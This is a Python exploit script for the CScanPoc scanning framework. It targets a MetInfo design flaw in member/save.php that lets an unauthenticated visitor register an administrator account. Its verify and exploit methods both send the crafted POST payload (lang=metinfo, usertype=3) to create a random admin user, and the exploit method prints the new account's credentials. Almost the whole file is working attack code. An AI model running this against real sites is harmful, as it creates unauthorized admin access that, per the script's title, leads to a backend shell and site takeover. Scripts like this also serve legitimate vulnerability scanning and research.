# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random


class Vuln(ABVuln):
    vuln_id = 'MetInfo_0023'  # 平台漏洞编号，留空
    name = 'MetInfo 设计缺陷可注册管理员用户直接后台getshell'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2013-12-12'  # 漏洞公布时间
    desc = '''
        漏洞出现在 member/save.php 文件中，
        数据库中当usertype为3时即为管理员权限，由代码可看出当lang=metinfo时，usertype=3，此时可直接注册账号切权限为管理员权限。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1386/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MetInfo'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ab08ddea-b659-4564-94d2-d1b7ee971cc2'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # https://bugs.shuimugan.com/bug/view?bug_no=45763
            # 生成随机注册信息
            randstr = 'admin_' + str(random.randint(1, 10000))
            payload = '/member/save.php?action=add'
            data = "lang=metinfo&yhid={username}&mm={password}&mm1={password1}&email=byzhiwen%40vip.qq.com&companyname=ceshia&code=FE2B&lxdh=18210056765&companyfax=&companyaddress=nicai&yzbm=100001&usertype=3&wz=".format(
                username=randstr, password=randstr, password1=randstr)
            url = self.target + payload
            r = requests.post(url, data=data)

            if r.status_code == 200:
                if 'success' in r.text or '成功' in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 生成随机注册信息
            randstr = 'admin_' + str(random.randint(1, 10000))
            payload = '/member/save.php?action=add'
            data = "lang=metinfo&yhid={username}&mm={password}&mm1={password1}&email=byzhiwen%40vip.qq.com&companyname=ceshia&code=FE2B&lxdh=18210056765&companyfax=&companyaddress=nicai&yzbm=100001&usertype=3&wz=".format(
                username=randstr, password=randstr, password1=randstr)
            url = self.target + payload
            r = requests.post(url, data=data)

            if r.status_code == 200:
                if 'success' in r.text or '成功' in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，已注册管理用户{user}，密码{passwd}'.format(
                        target=self.target, name=self.vuln.name, user=randstr, passwd=randstr))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
